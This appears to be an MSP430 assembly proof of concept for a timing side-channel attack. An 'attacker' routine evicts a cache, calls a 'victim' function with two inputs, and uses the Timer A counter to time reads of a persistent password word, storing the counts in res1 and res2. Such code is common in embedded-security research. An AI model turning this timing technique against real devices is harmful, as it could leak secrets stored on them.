    .global attacker
    .global victim
    .global TA0R
    .global TA0CTL
	.global res1
	.global res2
	.global evict
	.global pwd
    .sect ".TI.persistent"
pwd:
	.word 101

    .sect ".att_ram_code"
res1:
	.word 0
res2:
	.word 0
attacker:
	calla #evict
	mov #43, r12
	calla #victim
	mov #0x224, &TA0CTL
	mov &pwd, r12
	mov #0, &TA0CTL
	mov &TA0R, &res1

	calla #evict
	mov #1337, r12
	calla #victim
	mov #0x224, &TA0CTL
	mov &pwd, r12
	mov #0, &TA0CTL
	mov &TA0R, &res2

	reta
